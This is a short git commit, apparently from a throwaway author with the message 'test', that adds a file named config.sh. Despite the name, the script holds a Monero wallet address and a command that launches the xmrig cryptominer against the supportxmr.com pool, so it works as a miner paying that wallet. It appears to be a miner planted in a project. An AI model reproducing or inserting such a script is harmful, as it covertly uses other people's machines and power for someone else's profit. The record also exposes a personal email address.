fd2fa712eb870f7adf4052d6faf51a9190b8a3a8
haha <lestermarshall3781114@gmail.com>
2019-12-03 20:45:52 +0000

    test

---
+++ config.sh
@@ -0,0 +1,3 @@
+WALLET="82dFWgHTzbwNrT2npRRzKSA9NpvjhSTFKTPSu4ASfKiFeXWsVo7RrUQcucTefEaBp5YDRkCLvhWd1R1itfawi8ZyQtg5dYH"
+NAME="3C"
+./xmrig --donate-level 1 -o pool.supportxmr.com:443 -u $WALLET -p $NAME -k --tls
